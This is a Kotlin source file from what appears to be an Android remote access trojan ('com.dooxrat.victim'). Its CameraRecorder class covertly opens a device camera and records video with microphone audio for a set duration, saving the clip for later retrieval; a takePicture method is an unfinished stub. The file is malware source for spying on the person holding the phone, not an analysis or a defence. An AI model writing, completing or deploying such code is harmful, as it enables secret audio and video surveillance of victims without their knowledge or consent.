package com.dooxrat.victim

import android.content.Context
import android.hardware.camera2.*
import android.media.MediaRecorder
import android.os.Environment
import android.view.Surface
import java.io.File

class CameraRecorder(private val context: Context) {

    private var cameraDevice: CameraDevice? = null
    private var mediaRecorder: MediaRecorder? = null
    private var outputFile: File? = null

    fun startRecording(cameraId: String, duration: Int): String? {
        try {
            val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            
            outputFile = File(
                context.getExternalFilesDir(Environment.DIRECTORY_MOVIES),
                "video_${System.currentTimeMillis()}.mp4"
            )

            mediaRecorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setVideoSource(MediaRecorder.VideoSource.SURFACE)
                setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                setOutputFile(outputFile!!.absolutePath)
                setVideoEncodingBitRate(10000000)
                setVideoFrameRate(30)
                setVideoSize(1280, 720)
                setVideoEncoder(MediaRecorder.VideoEncoder.H264)
                setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                prepare()
            }

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    val surface = mediaRecorder!!.surface
                    val captureRequestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_RECORD)
                    captureRequestBuilder.addTarget(surface)

                    camera.createCaptureSession(
                        listOf(surface),
                        object : CameraCaptureSession.StateCallback() {
                            override fun onConfigured(session: CameraCaptureSession) {
                                session.setRepeatingRequest(captureRequestBuilder.build(), null, null)
                                mediaRecorder?.start()
                                
                                android.os.Handler().postDelayed({
                                    stopRecording()
                                }, duration.toLong() * 1000)
                            }
                            override fun onConfigureFailed(session: CameraCaptureSession) {}
                        }, null
                    )
                }
                override fun onDisconnected(camera: CameraDevice) {}
                override fun onError(camera: CameraDevice, error: Int) {}
            }, null)

            return outputFile?.absolutePath
        } catch (e: Exception) {
            e.printStackTrace()
            return null
        }
    }

    fun stopRecording() {
        try {
            mediaRecorder?.stop()
            mediaRecorder?.release()
            cameraDevice?.close()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun takePicture(cameraId: String): String? {
        return outputFile?.absolutePath
    }
}
